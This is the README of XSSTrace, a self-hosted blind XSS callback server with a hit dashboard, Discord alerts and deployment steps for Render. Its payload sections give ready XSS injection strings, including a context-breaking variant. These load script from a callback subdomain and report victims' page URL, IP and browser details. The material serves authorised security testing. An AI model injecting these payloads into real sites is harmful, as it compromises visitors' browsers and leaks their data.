# XSSTrace

![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)
![Express](https://img.shields.io/badge/Express-4.x-000000?logo=express&logoColor=white)
![Render](https://img.shields.io/badge/Deploy-Render-46E3B7?logo=render&logoColor=000)
![Discord](https://img.shields.io/badge/Discord-Notifications-5865F2?logo=discord&logoColor=white)
![License](https://img.shields.io/github/license/Ranveerrrrr/XSSTrace)

A self-hosted Blind XSS payload server and hit dashboard with unlimited markers, page grouping, filters, import/export, and Discord alerts.

<img width="1877" height="594" alt="image" src="https://github.com/user-attachments/assets/32518d7b-aab4-4601-80ba-fb870aa4d9da" />
<img width="1879" height="549" alt="image" src="https://github.com/user-attachments/assets/d054e05d-526e-4cd4-bbc8-2cdf6b1d04e1" />

## Why This Exists
[Watch the explanation here — 1:19:30 to 1:21:40](https://youtu.be/5o0Ldc8Kypg?si=3QyGhKjxDyGIKu9l&t=4770)
Blind XSS testing is painful when your callback tooling does not give you enough control.

- Burp Collaborator and Interactsh payloads are temporary or tied to a session.
- Public callback services can expire, rotate, or disappear.
- Classic XSS Hunter-style setups are useful, but many workflows end up with one generic payload path.
- When testing many fields, forms, endpoints, and roles, you need to know exactly which payload fired.










The problem is simple:

When you test many different fields, forms, endpoints, accounts, and roles, a generic Blind XSS callback only tells you that **something fired**. It does not always clearly tell you **which exact injection point caused the hit**.
For example, if you test payloads in:

- profile name
- profile bio
- support ticket
- admin note
- billing address
- internal comment
- contact form

and later receive a Blind XSS callback, you need to know exactly which one triggered.
That is the problem XSSTrace solves.
Instead of using one generic payload path, XSSTrace lets you create unlimited marker-based payloads:

```html
<script src="https://xss.yourdomain.com/signup-name"></script>
<script src="https://xss.yourdomain.com/admin-note"></script>
<script src="https://xss.yourdomain.com/billing-address"></script>
```

Everything after the domain root is the marker. When it fires, the dashboard shows where it came from, when it triggered, and can send a Discord notification.

## What You Get

- Payload route: `/<marker>`
- Password-protected dashboard: `/dashboard`
- Unlimited markers, for example `/firstname-profile`, `/admin-note`, `/support-ticket`
- Hit grouping by page URL/site
- Filters with suggestions for page URL, IP, and marker
- 3-dot page actions: copy URL, cut, paste into another page group, delete
- Full hit download as `callbacks.jsonl`
- Import old hit logs and append them without replacing current hits
- Optional Discord webhook notifications for every hit
- Optional Render persistent disk support so logs survive redeploys

## Recommended Architecture

Use a dedicated subdomain:

```text
Main website:       https://yourdomain.com
Blind XSS server:   https://xss.yourdomain.com
Dashboard:          https://xss.yourdomain.com/dashboard
Payload base:       https://xss.yourdomain.com/<marker>
```

Do not put this behind a static host. It needs a backend because it receives and stores callbacks.

## Step 1: Fork This Repository

1. Open this repository on GitHub.
2. Click **Fork**.
3. Choose your GitHub account.
4. Keep your fork **private** if you do not want your dashboard code/config visible.

Your fork will look like:

```text
https://github.com/YOUR_USERNAME/XSSTrace
```

## Step 2: Clone Your Fork

Clone your fork on your machine only so you can change example values and push your own copy.

```bash
git clone https://github.com/YOUR_USERNAME/XSSTrace.git
cd XSSTrace
```

## Step 3: Replace Example Domains

Search the repo for:

```text
xss.example.com
example.com
```

Replace them in documentation or examples with your real callback subdomain, for example:

```text
xss.yourdomain.com
```

The important runtime value is still the Render environment variable:

```text
PUBLIC_BASE_URL=https://xss.yourdomain.com
```

## Step 4: Push Your Fork

After your README/example changes:

```bash
git add .
git commit -m "Configure dashboard for my domain"
git push origin main
```

## Step 5: Create Render Web Service

1. Open [Render](https://render.com/).
2. Click **New +**.
3. Choose **Web Service**.
4. Connect GitHub.
5. Select your forked repository:

```text
YOUR_USERNAME/XSSTrace
```

6. Use these settings:

```text
Environment: Node
Build Command: npm install
Start Command: npm start
```

7. Create the service.

Render will give you a temporary domain like:

```text
https://xsstrace.onrender.com
```

Do not use that as your final payload domain if you have your own domain. Use it only until your custom subdomain is connected.

## Step 6: Set Render Environment Variables

In Render:

```text
Your Web Service -> Environment
```

Add:

| Key | Example | Required |
| --- | --- | --- |
| `PUBLIC_BASE_URL` | `https://xss.yourdomain.com` | Yes |
| `DASHBOARD_USERNAME` | `bugatsec` | Yes |
| `DASHBOARD_PASSWORD` | `use-a-strong-password` | Yes |
| `SESSION_SECRET` | `long-random-string` | Strongly recommended |
| `DISCORD_WEBHOOK_URL` | `https://discord.com/api/webhooks/...` | Optional |
| `DATA_DIR` | `/var/data` | Recommended with persistent disk |

Then redeploy the service.

You can check whether dashboard auth is configured:

```text
https://xss.yourdomain.com/health
```

Expected:

```json
{
  "authConfigured": true
}
```

The `/health` endpoint does not reveal your username, password, session secret, or Discord webhook URL.

## Step 7: Add Persistent Storage

If you want hits to stay forever until you delete them, add a persistent disk.

In Render:

1. Open your Web Service.
2. Go to **Disks**.
3. Add a disk.
4. Mount path:

```text
/var/data
```

5. Set this environment variable:

```text
DATA_DIR=/var/data
```

The hit log will be stored at:

```text
/var/data/callbacks.jsonl
```

Without a persistent disk, Render may lose the log on redeploy/restart.

## Step 8: Connect Your Subdomain

Use a subdomain like:

```text
xss.yourdomain.com
```

In Render:

1. Open your Web Service.
2. Go to **Settings -> Custom Domains**.
3. Add:

```text
xss.yourdomain.com
```

4. Render will show a DNS target.

In your domain/DNS dashboard:

1. Create the DNS record Render tells you to create.
2. Usually this is a CNAME from:

```text
xss
```

to something like:

```text
your-service.onrender.com
```

3. Wait for DNS to propagate.
4. Wait for Render TLS/HTTPS to become active.

Finally, make sure Render has:

```text
PUBLIC_BASE_URL=https://xss.yourdomain.com
```

Redeploy after changing it.

## Step 9: Add Discord Alerts

In Discord:

1. Open the channel where you want alerts.
2. Go to **Edit Channel -> Integrations -> Webhooks**.
3. Create a webhook.
4. Copy the webhook URL.
5. Add it in Render:

```text
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

Every new hit sends a Discord embed with:

- marker
- source type
- IP
- page URL/referrer
- user agent
<img width="598" height="275" alt="image" src="https://github.com/user-attachments/assets/792310fd-5a8c-48f9-8fb5-925e6a9ca0b7" />



## Step 10: Use The Dashboard

Open:

```text
https://xss.yourdomain.com/dashboard
```

Login with:

```text
DASHBOARD_USERNAME
DASHBOARD_PASSWORD
```

The dashboard gives you:

- payload builder
- total hit count
- unique marker count
- page URL groups
- filters for page URL, IP, and marker
- 3-dot page actions
- import/export controls
- clear-all logs

## Payload Usage

Basic marker:

```html
<script src="https://xss.yourdomain.com/blind-xss"></script>
```

Marker per injection point:

```html
<script src="https://xss.yourdomain.com/signup-name"></script>
<script src="https://xss.yourdomain.com/profile-bio"></script>
<script src="https://xss.yourdomain.com/admin-note"></script>
<script src="https://xss.yourdomain.com/billing-address"></script>
```

The dashboard groups hits by page URL and shows the marker so you know exactly which payload fired.

The payload builder can also produce a two-script variant:

```html
<script src="https://xss.yourdomain.com/blind-xss"></script>"/><script src="https://xss.yourdomain.com/blind-xss1"></script>
```

This can help in some broken HTML contexts where one form of injection closes/escapes differently than another.

## What Gets Logged

The app records:

- marker
- page URL or referrer
- IP address
- user agent
- browser language
- viewport
- source type
- timestamp

Source types:

| Source | Meaning |
| --- | --- |
| `payload-load` | The `/<marker>` JavaScript URL was requested |
| `script` | The JavaScript executed and posted back |
| `image` | The image fallback fired |
| `import` | The hit came from an imported log |

## Dashboard Page Actions

Each page group has a 3-dot menu:

- `Copy URL` copies the page URL/group key
- `Cut` selects all hits in that page group
- `Paste here` moves cut hits into another page group
- `Delete` deletes all hits for that page group

## Import And Export

`Download hits` downloads the current backend log:

```text
callbacks.jsonl
```

Selecting an import file previews it in the browser. It is not uploaded immediately.

`Add to logs` appends the previewed hits to the backend log. It does not replace existing hits.

Supported import formats:

- JSONL, one hit per line
- JSON array
- JSON object with a `callbacks` array

## Security Notes

- Keep your fork private if you do not want others to inspect your setup.
- Do not commit real dashboard passwords.
- Do not commit Discord webhook URLs.
- Do not commit `callbacks.jsonl`.
- Use HTTPS for your callback domain.
- Use a strong `SESSION_SECRET`.
- Rotate credentials if you accidentally expose them.

## License

See [LICENSE](LICENSE).
